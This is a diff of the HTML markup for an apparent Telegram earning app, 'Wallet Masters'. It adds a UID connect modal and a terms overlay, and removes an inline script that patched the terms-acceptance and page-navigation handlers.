+  <div id="connectModal" class="modal-overlay hidden" onclick="if(event.target===this)closeModal()">
+    <div class="modal-box">
+      <div class="modal-title" id="modalTitle">Connect App</div>
+      <div class="form-group"><label>Your UID in that app</label><input id="modalUID" type="text" placeholder="Enter your UID"/></div>
+      <div class="modal-err hidden" id="uidErr"></div>
+      <div style="display:flex;gap:10px;margin-top:16px">
+        <button class="btn-outline" style="flex:1" onclick="closeModal()">Cancel</button>
+        <button class="btn-primary" style="flex:1" id="connectBtn" onclick="submitUID()">Connect</button>
+      </div>
+    </div>
+  </div>
+
+</div><!-- /app -->
+
+<!-- TOAST -->
+<div id="toastEl" class="toast"></div>
+
+<!-- TERMS OVERLAY -->
+<div id="termsOverlay" style="display:none;position:fixed;inset:0;background:rgba(0,0,0,.85);z-index:8000;display:flex;align-items:flex-end">
+  <div style="background:#0e1629;border-radius:20px 20px 0 0;padding:24px;width:100%;max-height:80vh;overflow-y:auto">
+    <h2 style="font-size:18px;font-weight:700;color:#f0f4ff;margin-bottom:8px">Welcome to Wallet Masters!</h2>
+    <p style="font-size:13px;color:#7a90b0;margin-bottom:16px">Please accept our Terms &amp; Conditions to continue.</p>
+    <div style="background:#131f35;border-radius:12px;padding:14px;font-size:12px;color:#7a90b0;line-height:1.7;max-height:200px;overflow-y:auto;margin-bottom:16px">
+      By using Wallet Masters you agree to our Terms &amp; Conditions. You must be 18+. A 4% gateway fee applies to withdrawals. Fraudulent activity results in account termination. Wallet Masters reserves the right to modify earning rates, fees, and limits at any time.
+    </div>
+    <button class="btn-primary" onclick="acceptTerms()">✓ I Accept — Start Earning!</button>
+  </div>
 </div>
 
 <script src="https://cdnjs.cloudflare.com/ajax/libs/qrcodejs/1.0.0/qrcode.min.js"></script>
 <script src="app.js"></script>
-
-  <!-- HOTFIX patch: acceptTerms never blocks on network error -->
-  <script>
-    window.addEventListener('DOMContentLoaded', function() {
-      // Hook showPage to load testimonials
-      const _origShowPage = window.showPage;
-      window.showPage = function(page) {
-        if (typeof _origShowPage === 'function') _origShowPage(page);
-        if (page === 'testimonials') { setTimeout(() => { if (typeof loadTestimonialsPage === 'function') loadTestimonialsPage(); }, 100); }
-      };
-      // Override acceptTerms to be resilient
-      var _origAcceptTerms = window.acceptTerms;
-      window.acceptTerms = async function() {
-        var btn = document.getElementById('acceptTermsBtn');
-        if (btn) { btn.textContent = 'Opening wallet...'; btn.disabled = true; }
-        // Show loading splash
-        var splash = document.getElementById('splash');
-        if (splash) splash.innerHTML = '<div class="splash-inner"><div class="splash-logo-wrap"><svg width="60" height="60" viewBox="0 0 60 60" fill="none"><circle cx="30" cy="30" r="30" fill="url(#sg)"/><text x="30" y="40" text-anchor="middle" font-size="26" font-family="Arial" font-weight="700" fill="#fff">W</text><defs><linearGradient id="sg" x1="0" y1="0" x2="60" y2="60"><stop stop-color="#2563eb"/><stop offset="1" stop-color="#7c3aed"/></linearGradient></defs></svg></div><h1 class="splash-title">Wallet Masters</h1><p class="splash-sub">Setting up your wallet...</p><div class="splash-bar"><div class="splash-fill"></div></div></div>';
-        // Best-effort save - never block user
-        try { await fetch(window.location.origin+'/api/accept-terms',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({initData:window.Telegram&&window.Telegram.WebApp?window.Telegram.WebApp.initData:'',unsafeUser:window.Telegram&&window.Telegram.WebApp&&window.Telegram.WebApp.initDataUnsafe?window.Telegram.WebApp.initDataUnsafe.user:null})}); } catch(e) { console.warn('T&C save best-effort:', e.message); }
-        // Always launch
-        if (typeof state !== 'undefined') state.termsAccepted = true;
-        setTimeout(function() { if (typeof launchApp === 'function') launchApp(); }, 500);
-      };
-    });
-  </script>
 </body>
 </html>
